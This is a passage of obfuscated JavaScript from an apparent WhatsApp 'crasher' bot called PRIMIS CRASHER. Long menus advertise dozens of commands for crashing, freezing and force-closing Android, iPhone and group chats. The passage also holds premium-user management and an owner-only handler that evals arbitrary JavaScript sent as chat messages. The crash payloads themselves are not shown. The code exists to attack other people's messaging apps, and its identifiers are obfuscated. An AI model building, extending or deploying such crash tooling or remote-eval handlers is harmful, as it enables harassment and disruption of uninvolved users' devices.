          const _0x167184 = "\n\n*┏━━ 🐉 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 🐉 ━━┓*\n> ┃🐉│ ʙᴏᴛ ɴᴀᴍᴇ: *PRIMIS CRASHER*\n> ┃🐉│ ᴠᴇʀsɪᴏɴ: *5.0.0*\n> ┃🐉│ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *DS PRIMIS*\n> ┃🐉│ ᴘʀᴇғɪx: *" + _0x177dd4 + "*\n> ┃🐉│ ᴛʏᴘᴇ: *BUG-MENU*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐂𝐑𝐀𝐒𝐇 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "offdroid*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crashandro*\n> ┃🐉│ ➤ *" + _0x177dd4 + "offios*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crashiphone*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐕𝐕𝐈𝐏 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "die*\n> ┃🐉│ ➤ *" + _0x177dd4 + "delaymarker*\n> ┃🐉│ ➤ *" + _0x177dd4 + "bughard*\n> ┃🐉│ ➤ *" + _0x177dd4 + "delayhard*\n> ┃🐉│ ➤ *" + _0x177dd4 + "x-primis*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ht-bug*\n> ┃🐉│ ➤ *" + _0x177dd4 + "pr-bug*\n> ┃🐉│ ➤ *" + _0x177dd4 + "zeph*\n> ┃🐉│ ➤ *" + _0x177dd4 + "jaxx*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ghost*\n> ┃🐉│ ➤ *" + _0x177dd4 + "dead*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crashprim*\n> ┃🐉│ ➤ *" + _0x177dd4 + "x-freeze*\n> ┃🐉│ ➤ *" + _0x177dd4 + "bantai*\n> ┃🐉│ ➤ *" + _0x177dd4 + "yandex*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "offgc [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "buggc [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crashgroup [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "👾 [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🕊️ [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "♣️ [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🇭🇹 [ IN GC ]*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n> © *Powered By Ds Primis*\n";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'image': {
              'url': "https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg"
            },
            'caption': _0x167184
          }, {
            'quoted': _0x51e776
          });
          _0x35a9de.sendMessage(_0x51e776.chat, {
            'audio': fs.readFileSync("./media/primis.mp3"),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x51e776
          });
        }
        break;
      case "bug-menu2":
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '☠️',
              'key': _0x51e776.key
            }
          });
          const _0x23c71b = "\n\n*┏━━ 🐉 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 🐉 ━━┓*\n> ┃🐉│ ʙᴏᴛ ɴᴀᴍᴇ: *PRIMIS CRASHER*\n> ┃🐉│ ᴠᴇʀsɪᴏɴ: *5.0.0*\n> ┃🐉│ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *DS PRIMIS*\n> ┃🐉│ ᴘʀᴇғɪx: *" + _0x177dd4 + "*\n> ┃🐉│ ᴛʏᴘᴇ: *BUG-MENU2*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐒𝐇𝐀𝐃𝐎𝐖 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "glitch*\n> ┃🐉│ ➤ *" + _0x177dd4 + "overload*\n> ┃🐉│ ➤ *" + _0x177dd4 + "phantom*\n> ┃🐉│ ➤ *" + _0x177dd4 + "shockwave*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐍𝐈𝐆𝐇𝐓𝐅𝐀𝐋𝐋 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "emberstrike*\n> ┃🐉│ ➤ *" + _0x177dd4 + "frostveil*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ironclash*\n> ┃🐉│ ➤ *" + _0x177dd4 + "voidspire*\n> ┃🐉│ ➤ *" + _0x177dd4 + "luminark*\n> ┃🐉│ ➤ *" + _0x177dd4 + "stormveil*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐄𝐌𝐎𝐉𝐈 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🐴 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🐲 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🐍 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "👹 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🦎 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🦠 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🎃 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "👽 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🐉 [ IN DM ]*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐃𝐄𝐋𝐀𝐘 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "off*\n> ┃🐉│ ➤ *" + _0x177dd4 + "agus*\n> ┃🐉│ ➤ *" + _0x177dd4 + "yanto*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crash*\n> ┃🐉│ ➤ *" + _0x177dd4 + "x-crash*\n> ┃🐉│ ➤ *" + _0x177dd4 + "invis*\n> ┃🐉│ ➤ *" + _0x177dd4 + "delay-attack*\n> ┃🐉│ ➤ *" + _0x177dd4 + "delay-combo*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "rift [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "surge [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "pulse [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "breaker [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "prim-attack [ IN GC ]*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n> © *Powered By Ds Primis*\n";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'image': {
              'url': "https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg"
            },
            'caption': _0x23c71b
          }, {
            'quoted': _0x51e776
          });
          _0x35a9de.sendMessage(_0x51e776.chat, {
            'audio': fs.readFileSync("./media/primis.mp3"),
            'mimetype': 'audio/mpeg',
            'ptt': true
          }, {
            'quoted': _0x51e776
          });
        }
        break;
      case "other-bug":
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '☠️',
              'key': _0x51e776.key
            }
          });
          const _0x1f53b5 = "\n\n*┏━━ 🐉 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 🐉 ━━┓*\n> ┃🐉│ ʙᴏᴛ ɴᴀᴍᴇ: *PRIMIS CRASHER*\n> ┃🐉│ ᴠᴇʀsɪᴏɴ: *5.0.0*\n> ┃🐉│ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *DS PRIMIS*\n> ┃🐉│ ᴘʀᴇғɪx: *" + _0x177dd4 + "*\n> ┃🐉│ ᴛʏᴘᴇ: *OTHER-BUG*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐏𝐑𝐈𝐌𝐈𝐒 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "primis-visble*\n> ┃🐉│ ➤ *" + _0x177dd4 + "primis-visble1*\n> ┃🐉│ ➤ *" + _0x177dd4 + "primis-visble2*\n> ┃🐉│ ➤ *" + _0x177dd4 + "primis-visble3*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐁𝐋𝐀𝐍𝐊 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crash-blank*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crash-blankui*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crash-blank2*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crash-hardblank*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐅𝐎𝐑𝐂𝐋𝐎𝐒𝐄 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "zephyr-forclose*\n> ┃🐉│ ➤ *" + _0x177dd4 + "james-home*\n> ┃🐉│ ➤ *" + _0x177dd4 + "trash-forclose*\n> ┃🐉│ ➤ *" + _0x177dd4 + "alann-forclose*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ds-primis*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐃𝐒 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ds-combo*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ds-blank*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ds-forclose*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ds-delay*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐄𝐓𝐄𝐊𝐄𝐑 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "invis*\n> ┃🐉│ ➤ *" + _0x177dd4 + "super*\n> ┃🐉│ ➤ *" + _0x177dd4 + "home*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n> © *Powered By Ds Primis*\n";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'image': {
              'url': "https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg"
            },
            'caption': _0x1f53b5
          }, {
            'quoted': _0x51e776
          });
          _0x35a9de.sendMessage(_0x51e776.chat, {
            'audio': fs.readFileSync('./media/primis.mp3'),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x51e776
          });
        }
        break;
      case "all-menu":
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '☠️',
              'key': _0x51e776.key
            }
          });
          const _0x4e66d5 = "\n\n┏━━ ⚡ 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 ⚡ ━━┓\n┃ ʙᴏᴛ ɴᴀᴍᴇ: *PRIMIS CRASHER*\n┃ ᴠᴇʀsɪᴏɴ: *5.0.0*\n┃ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *DS PRIMIS*\n┃ ᴘʀᴇғɪx: *" + _0x177dd4 + "*\n┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "addprem*\n> ┃🐉│ ➤ *" + _0x177dd4 + "delprem*\n> ┃🐉│ ➤ *" + _0x177dd4 + "public*\n> ┃🐉│ ➤ *" + _0x177dd4 + "self*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ping*\n> ┃🐉│ ➤ *" + _0x177dd4 + "owner*\n> ┃🐉│ ➤ *" + _0x177dd4 + "script*\n> ┃🐉│ ➤ *" + _0x177dd4 + "tagall*\n> ┃🐉│ ➤ *" + _0x177dd4 + "hidetag*\n> ┃🐉│ ➤ *" + _0x177dd4 + "left*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐂𝐑𝐀𝐒𝐇 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "offdroid*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crashandro*\n> ┃🐉│ ➤ *" + _0x177dd4 + "offios*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crashiphone*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐕𝐕𝐈𝐏 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "die*\n> ┃🐉│ ➤ *" + _0x177dd4 + "delaymarker*\n> ┃🐉│ ➤ *" + _0x177dd4 + "bughard*\n> ┃🐉│ ➤ *" + _0x177dd4 + "delayhard*\n> ┃🐉│ ➤ *" + _0x177dd4 + "x-primis*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ht-bug*\n> ┃🐉│ ➤ *" + _0x177dd4 + "pr-bug*\n> ┃🐉│ ➤ *" + _0x177dd4 + "zeph*\n> ┃🐉│ ➤ *" + _0x177dd4 + "jaxx*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ghost*\n> ┃🐉│ ➤ *" + _0x177dd4 + "dead*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crashprim*\n> ┃🐉│ ➤ *" + _0x177dd4 + "x-freeze*\n> ┃🐉│ ➤ *" + _0x177dd4 + "bantai*\n> ┃🐉│ ➤ *" + _0x177dd4 + "yandex*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "offgc*\n> ┃🐉│ ➤ *" + _0x177dd4 + "buggc*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crashgroup*\n> ┃🐉│ ➤ *" + _0x177dd4 + "👾 [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🕊️ [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "♣️ [ IN GC ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🇭🇹 [ IN GC ]*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐒𝐇𝐀𝐃𝐎𝐖 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "glitch*\n> ┃🐉│ ➤ *" + _0x177dd4 + "overload*\n> ┃🐉│ ➤ *" + _0x177dd4 + "phantom*\n> ┃🐉│ ➤ *" + _0x177dd4 + "shockwave*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐍𝐈𝐆𝐇𝐓𝐅𝐀𝐋𝐋 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "emberstrike*\n> ┃🐉│ ➤ *" + _0x177dd4 + "frostveil*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ironclash*\n> ┃🐉│ ➤ *" + _0x177dd4 + "voidspire*\n> ┃🐉│ ➤ *" + _0x177dd4 + "luminark*\n> ┃🐉│ ➤ *" + _0x177dd4 + "stormveil*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐄𝐌𝐎𝐉𝐈 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🐴 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🐲 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🐍 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "👹 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🦎 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🦠 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🎃 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "👽 [ IN DM ]*\n> ┃🐉│ ➤ *" + _0x177dd4 + "🐉 [ IN DM ]*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐃𝐄𝐋𝐀𝐘 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "off*\n> ┃🐉│ ➤ *" + _0x177dd4 + "agus*\n> ┃🐉│ ➤ *" + _0x177dd4 + "yanto*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crash*\n> ┃🐉│ ➤ *" + _0x177dd4 + "x-crash*\n> ┃🐉│ ➤ *" + _0x177dd4 + "invis*\n> ┃🐉│ ➤ *" + _0x177dd4 + "delay-attack*\n> ┃🐉│ ➤ *" + _0x177dd4 + "delay-combo*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐆𝐑𝐎𝐔𝐏 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "rift*\n> ┃🐉│ ➤ *" + _0x177dd4 + "surge*\n> ┃🐉│ ➤ *" + _0x177dd4 + "pulse*\n> ┃🐉│ ➤ *" + _0x177dd4 + "breaker*\n> ┃🐉│ ➤ *" + _0x177dd4 + "prim-attack*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐏𝐑𝐈𝐌𝐈𝐒 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "primis-visble*\n> ┃🐉│ ➤ *" + _0x177dd4 + "primis-visble1*\n> ┃🐉│ ➤ *" + _0x177dd4 + "primis-visble2*\n> ┃🐉│ ➤ *" + _0x177dd4 + "primis-visble3*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐁𝐋𝐀𝐍𝐊 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crash-blank*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crash-blankui*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crash-blank2*\n> ┃🐉│ ➤ *" + _0x177dd4 + "crash-hardblank*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐅𝐎𝐑𝐂𝐋𝐎𝐒𝐄 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "zephyr-forclose*\n> ┃🐉│ ➤ *" + _0x177dd4 + "james-home*\n> ┃🐉│ ➤ *" + _0x177dd4 + "trash-forclose*\n> ┃🐉│ ➤ *" + _0x177dd4 + "alann-forclose*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ds-primis*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐃𝐒 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ds-combo*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ds-blank*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ds-forclose*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ds-delay*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐄𝐓𝐄𝐊𝐄𝐑 𝐁𝐔𝐆𝐒 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "invis*\n> ┃🐉│ ➤ *" + _0x177dd4 + "super*\n> ┃🐉│ ➤ *" + _0x177dd4 + "home*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n> © *Powered By Ds Primis*\n";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'image': {
              'url': "https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg"
            },
            'caption': _0x4e66d5
          }, {
            'quoted': _0x51e776
          });
          _0x35a9de.sendMessage(_0x51e776.chat, {
            'audio': fs.readFileSync("./media/primis.mp3"),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x51e776
          });
        }
        break;
      case "addprem":
        {
          if (!_0xe3a414) {
            return _0x1fbef7(mess.owner);
          }
          const _0x45f782 = _0x3271e7.join(" ");
          const _0x30e0c9 = _0x45f782.split('|')[0x0];
          const _0x492d94 = _0x45f782.split('|')[0x1];
          if (!_0x30e0c9) {
            return _0x1fbef7("where is the number and how many days do you want? example : " + (_0x177dd4 + _0x54dd8f) + " @tag|30d");
          }
          if (!_0x492d94) {
            return _0x1fbef7("How many days do you want?");
          }
          let _0x45024e = _0x51e776.mentionedJid[0x0] ? _0x51e776.mentionedJid[0x0] : _0x51e776.quoted ? _0x51e776.quoted.sender : _0x30e0c9.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          if (owner.includes(_0x45024e)) {
            return _0x1fbef7("lol, the owner is free");
          }
          const _0x17e7e3 = _0xff5fcf.checkPremiumUser(_0x45024e);
          if (_0x17e7e3) {
            return _0x1fbef7("Suscesfully add premium");
          }
          let _0x225c8c = await _0x35a9de.onWhatsApp(_0x45024e);
          if (_0x225c8c[0x0].exists) {
            _0xff5fcf.addPremiumUser(_0x45024e, _0x492d94);
            await _0x598ae1(0xbb8);
            const _0x53c186 = {
              'text': "Suscesfully add premium",
              'contextInfo': {
                'externalAdReply': {
                  'title': "premium user",
                  'previewType': "PHOTO",
                  'thumbnailUrl': "https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg",
                  'sourceUrl': "https://whatsapp.com/channel/0029VbAqjwm1CYoTLEg7KR44"
                }
              }
            };
            return _0x35a9de.sendMessage(_0x51e776.chat, _0x53c186, {
              'quoted': _0x51e776
            });
          } else {
            _0x1fbef7("not found");
          }
        }
        break;
      case "delprem":
        {
          if (!_0xe3a414) {
            return _0x1fbef7(mess.owner);
          }
          if (!_0x3271e7[0x0]) {
            return _0x1fbef7("who wants to be " + _0x54dd8f + "? use numbers/tags, example : " + _0x177dd4 + "delprem @tag");
          }
          let _0x51566b = _0x51e776.quoted ? _0x51e776.quoted.sender : _0xc9fb1a.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          const _0x53ffd4 = _0xff5fcf.checkPremiumUser(_0x51566b);
          if (!_0x53ffd4) {
            return _0x1fbef7("this is not a premium user");
          }
          let _0x2bc7fe = await _0x35a9de.onWhatsApp(_0x51566b);
          if (_0x2bc7fe[0x0].exists) {
            let _0x393229 = JSON.parse(fs.readFileSync("./start/lib/database/premium.json"));
            _0x393229.splice(_0xff5fcf.getPremiumPosition(_0x51566b), 0x1);
            fs.writeFileSync("./start/lib/database/premium.json", JSON.stringify(_0x393229));
            _0x1fbef7("the user has been deleted");
          } else {
            _0x1fbef7("not found");
          }
        }
        break;
      case "ping":
      case 'p':
        await _0x35a9de.sendMessage(_0x16ba37, {
          'react': {
            'text': '🚀',
            'key': _0x51e776.key
          }
        });
        {
          async function _0x262c73(_0xb4b9c6) {
            let _0x22226c = new Date();
            let {
              key: _0x4a311a
            } = await _0x35a9de.sendMessage(_0xb4b9c6, {
              'text': 'wait..'
            });
            let _0x48c9ec = new Date() - _0x22226c;
            var _0x30ccf7 = "*Pong*:\n> ⏱️ " + _0x48c9ec + "ms (" + Math.round(_0x48c9ec / 0x64) / 0xa + 's)';
            await _0x598ae1(0x3e8);
            await _0x35a9de.sendMessage(_0xb4b9c6, {
              'text': _0x30ccf7,
              'edit': _0x4a311a
            });
          }
          _0x262c73(_0x16ba37);
        }
        break;
      case "left":
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '🏃',
              'key': _0x51e776.key
            }
          });
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!_0x4e51fb) {
            return _0x1fbef7(mess.group);
          }
          const _0x191cef = _0x35a9de.subject || "This group";
          await _0x1fbef7("🚪 The bot to leave the group  " + _0x191cef + "...");
          await _0x35a9de.groupLeave(_0x51e776.chat);
        }
        break;
      case "tagall":
        await _0x35a9de.sendMessage(_0x51e776.chat, {
          'react': {
            'text': "🗣️",
            'key': _0x51e776.key
          }
        });
        if (!_0x4e51fb) {
          return _0x1fbef7(mess.group);
        }
        let _0x5dea8d = "*👥 ᴛᴀɢ ᴀʟʟ ʙʏ ᴘʀɪᴍɪs ᴄʀᴀsʜᴇʀ*\n \n                 🗞️ *ᴍᴇssᴀɢᴇ : " + (q ? q : "ʙʟᴀɴᴋ") + "*\n\n";
        for (let _0x2424b0 of _0x2fd7c2) {
          _0x5dea8d += "🌹 @" + _0x2424b0.id.split('@')[0x0] + "\n";
        }
        _0x35a9de.sendMessage(_0x51e776.chat, {
          'text': _0x5dea8d,
          'mentions': _0x2fd7c2.map(_0x47d4d5 => _0x47d4d5.id)
        }, {
          'quoted': _0x51e776
        });
        break;
      default:
        if (_0x36cf00.startsWith('>')) {
          if (!_0xe3a414) {
            return;
          }
          try {
            let _0x55621b = await eval(_0x36cf00.slice(0x2));
            if (typeof _0x55621b !== "string") {
              _0x55621b = require('util').inspect(_0x55621b);
            }
            await _0x51e776.reply(_0x55621b);
          } catch (_0x2eb5bb) {
            _0x51e776.reply(String(_0x2eb5bb));
          }
        }
        if (_0x36cf00.startsWith('<')) {
          if (!_0xe3a414) {
            return;
          }
          let _0x55a98d = _0x36cf00.trim().split(/ +/)[0x0];
          let _0x586c2b;
          try {
            _0x586c2b = await eval("(async () => { " + (_0x55a98d == '>>' ? "return" : '') + " " + q + '})()');
          } catch (_0x505f83) {
            _0x586c2b = _0x505f83;
          } finally {
            await _0x51e776.reply(require('util').format(_0x586c2b));
          }
        }
    }
  } catch (_0x475ba4) {
    console.log(require("util").format(_0x475ba4));
  }
};
let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log("[0;32m" + __filename + " [1;32mupdated![0m");
  delete require.cache[file];
  require(file);
});
